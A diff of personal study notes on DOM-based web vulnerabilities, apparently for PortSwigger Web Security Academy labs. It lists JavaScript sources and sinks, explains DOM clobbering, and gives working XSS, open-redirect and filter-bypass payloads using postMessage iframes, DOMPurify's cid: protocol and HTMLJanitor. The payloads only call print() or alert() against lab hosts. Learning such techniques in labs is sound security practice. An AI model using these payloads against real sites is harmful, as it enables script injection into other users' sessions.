@@ -1,4 +1,5 @@
-## Common sources & sinks
+##  General info
+#### Common sources & sinks
 ```
 document.URL
 document.documentURI
@@ -109,7 +110,7 @@ history.replaceState()
 requestFileSystem()
 RegExp()
 ```
-### Sinks for open redirect vulns
+#### Sinks for open redirect vulns
 ```
 location
 location.host
@@ -127,7 +128,7 @@ XMLHttpRequest.send()
 jQuery.ajax()
 $.ajax()
 ```
-### DOM-clobbering
+#### DOM-clobbering
 A common pattern used by JavaScript developers is:
 ```
 var someObject = window.someObject || {};
@@ -158,34 +159,41 @@ example i<element.attributes.length) are not met, and the filter simply moves on
 results in the  onclick event being ignored altogether by the filter, which subsequently allows the alert() function 
 to be called in the browser.
 
-
-
 ## LAB payloads
+#### DOM XSS using web messages
 ```html
-# DOM XSS using web messages
+
 --> find that addEventListener() call that listens for a web message
 <iframe src="https://...web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()
 >','*')">
+```
 
-# DOM XSS using web messages and a JavaScript URL
+#### DOM XSS using web messages and a JavaScript URL
+```html
 --> addEventListener() + indexOf() (which checks that looks for the strings "http:" or "https:" anywhere within the web 
 message)
 <iframe src="https://...web-security-academy.net/?" onload="this.contentWindow.postMessage('javascript:print
 (%22https:%22)','*')">
 
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
 
-# DOM XSS using web messages and JSON.parse
+#### DOM XSS using web messages and JSON.parse
+```html
 --> JSON.parse() + load-channel + iframe src
 <iframe src="https://...web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",
 \"url\":\"javascript:print()\"}","*")'>
 
-# DOM-based open redirection
---> look at post page and find vulnerable script, send url param inside url
-https://...web-security-academy.net/post?postId=5&url=https://exploit-...exploit-server.
-net/exploit
+```
 
-# DOM-based cookie manipulation
+#### DOM-based open redirection
+```html
+--> look at post page and find vulnerable script, send url param inside url
+https://...web-security-academy.net/post?postId=5&url=https://exploit-...exploit-server.net/exploit
+```
+
+#### DOM-based cookie manipulation
+```html
 --> find script on product page, there is last viewed link on all pages, breake the anchore tag
 '><script>print()</script>
 --> find that windows.location takes raw url, so it is possible to add some params to valid url and trigger XSS
@@ -195,8 +203,10 @@ onload=window.location.replace("https://...web-security-academy.net/")>
 
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if
 (!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
+```
 
-# Exploiting DOM clobbering to enable XSS
+#### Exploiting DOM clobbering to enable XSS
+```html
 --> The page for a specific blog post imports the JavaScript file loadCommentsWithDomClobbering.js, which contains 
 the following code:
 let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
@@ -206,7 +216,10 @@ attribute
 --> DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes.
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:&#x22;onerror=alert(1)//'>
 
-# Clobbering DOM attributes to bypass HTML filters
+```
+
+#### Clobbering DOM attributes to bypass HTML filters
+```html
 --> lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering.
 --> The library uses the attributes property to filter HTML attributes
 --> after a 500ms delay, iframe adds the #x fragment to the end of the page URL (delay is to ensure the commend with 
@@ -217,30 +230,4 @@ injection is loaded)
 --> alert might not work, use print
 <form id=x tabindex=0 onfocus=print(1)><input id=attributes> - add to comment
 <iframe src=https://...web-security-academy.net/post?postId=8 onload="setTimeout(()=>this.src=this.src+'#x',500)">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ```
